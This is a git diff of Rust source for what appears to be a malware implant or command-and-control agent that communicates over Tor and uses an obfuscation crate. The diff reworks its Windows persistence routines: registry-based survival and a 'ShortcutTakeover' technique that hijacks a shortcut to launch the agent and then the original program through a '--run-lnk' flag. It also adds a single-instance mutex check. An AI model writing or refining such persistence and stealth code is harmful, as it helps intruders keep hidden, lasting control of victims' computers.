@@ -11,7 +11,6 @@ use arti_client::{
     StreamPrefs,
     DataStream,
 };
-use config::{get_mutex_name, Persistence};
 use goldberg::goldberg_int;
 use tokio::io::{
     AsyncWriteExt,
@@ -49,15 +48,15 @@ struct OutputMessage {
 }
 
 #[inline]
-fn persist(id: &str, hostname: &str) -> bool {
+fn persist() -> bool {
         // Persitence:
     match config::persistence() {
-        Persistence::None => {
+        config::Persistence::None => {
             debug_println!("no persistence mechanism enabled");
         },
-        Persistence::WindowsRegistry => {
+        config::Persistence::WindowsRegistry => {
             debug_println!("'WindowsRegistry' based persistence");
-            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone(), &id) {
+            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone()) {
                 Ok(_) => {
                     return true;
                 },
@@ -66,9 +65,9 @@ fn persist(id: &str, hostname: &str) -> bool {
                 },
             }
         },
-        Persistence::ShortcutTakeover => {
+        config::Persistence::ShortcutTakeover => {
             debug_println!("'ShortcutTakeover' based persistence");
-            match win_persist::shortcut_takeover(&id, &hostname) {
+            match win_persist::shortcut_takeover(&config::get_lnk_target_program_path(), &config::get_lnk_shortcut_name()) {
                 Ok(_) => {
                     return true;
                 },
@@ -85,7 +84,7 @@ fn persist(id: &str, hostname: &str) -> bool {
 async fn main() {
     helpers::set_working_dir_to_program_dir();
 
-    if get_mutex_name().len() != 0 {
+    if config::get_mutex_name().len() != 0 {
         match mutex::create_program_mutex() {
             Ok(mutex_already_exists) => {
                 if mutex_already_exists {
@@ -111,14 +110,20 @@ async fn main() {
         Err(_) => "unknown".to_string(),
     };
 
-    {
-        let id = "";
-
-        // TODO: There is an issue. If an agent fails to
-        // acquire an ID then it won't persist. Fix this.
-        let persisted = persist(&id, &hostname);
-        debug_println!("agent persistence process returned: {}", persisted);
+    let args: Vec<String> = env::args().collect();
+    for arg in args.iter() {
+        if arg == "--run-lnk" {
+            match exc::run_and_forget(&config::get_lnk_target_program_path()) {
+                Ok(_) => {},
+                Err(e) => {
+                    debug_println!("failed to run lnk target program: {}", e);
+                },
+            }
+        }
     }
+
+    let persisted = persist();
+    debug_println!("agent persistence process returned: {}", persisted);
     
     let os_name = env::consts::OS;
     let sys_arch = env::consts::ARCH;
